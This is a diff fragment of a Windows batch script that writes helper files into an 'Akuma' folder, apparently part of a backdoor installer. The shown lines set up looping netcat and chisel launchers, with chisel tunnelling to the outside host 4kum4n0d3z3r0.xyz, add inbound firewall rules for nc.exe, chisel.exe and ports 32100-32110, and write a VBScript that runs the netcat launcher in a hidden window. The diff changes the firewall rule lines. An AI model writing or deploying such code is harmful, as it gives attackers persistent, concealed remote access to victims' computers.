@@ -20,9 +20,8 @@ echo goto start >> %homedrive%\Akuma\nc.bat
 echo :start >> %homedrive%\Akuma\chisel.bat
 echo %homedrive%\Akuma\chisel.exe client 4kum4n0d3z3r0.xyz:32101 127.0.0.1:32102 >> %homedrive%\Akuma\chisel.bat
 echo goto start >> %homedrive%\Akuma\chisel.bat
-echo netsh advfirewall firewall delete rule name="Akumanc" >> %homedrive%\Akuma\ntwrk.bat
-echo powershell New-NetFirewallRule -DisplayName "Akumanc" -Direction Inbound -Program "%homedrive%\Akuma\nc\nc.exe" -Action Allow >> %homedrive%\Akuma\ntwrk.bat
-echo netsh advfirewall firewall delete rule name="Akumachisel" >> %homedrive%\Akuma\ntwrk.bat
+echo netsh advfirewall firewall delete rule name=".akuma" >> %homedrive%\Akuma\ntwrk.bat
+echo netsh advfirewall firewall add rule name=".akuma" dir=in action=allow protocol=TCP localport=32100-32110 >> %homedrive%\Akuma\ntwrk.bat
 echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inbound -Program "%homedrive%\Akuma\chisel.exe" -Action Allow >> %homedrive%\Akuma\ntwrk.bat
 echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\nc.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
